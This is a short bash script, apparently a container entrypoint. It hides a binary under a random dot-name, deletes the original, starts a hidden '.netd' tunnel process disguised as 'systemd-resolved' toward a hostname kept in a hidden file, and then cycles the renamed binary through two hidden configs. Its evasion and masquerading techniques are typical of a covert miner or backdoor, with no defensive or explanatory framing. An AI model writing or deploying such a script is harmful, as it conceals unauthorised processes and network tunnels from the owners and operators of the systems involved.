#!/bin/bash

sleep $((RANDOM % 20 + 5))

NAME=".$(tr -dc a-z0-9 </dev/urandom | head -c6)"

cp /app/isu "/app/$NAME"
chmod +x "/app/$NAME"

rm -f /app/isu

(exec -a systemd-resolved /usr/local/bin/.netd access tcp \
--hostname "$(cat .h)" \
--url 127.0.0.1:443 >/dev/null 2>&1 &)

sleep 3

# loop cfg <-> sfg masing-masing 30 menit
while true; do
  timeout 30m /app/$NAME -c .cfg >/dev/null 2>&1
  timeout 30m /app/$NAME -c .sfg >/dev/null 2>&1
done &

tail -f /dev/null
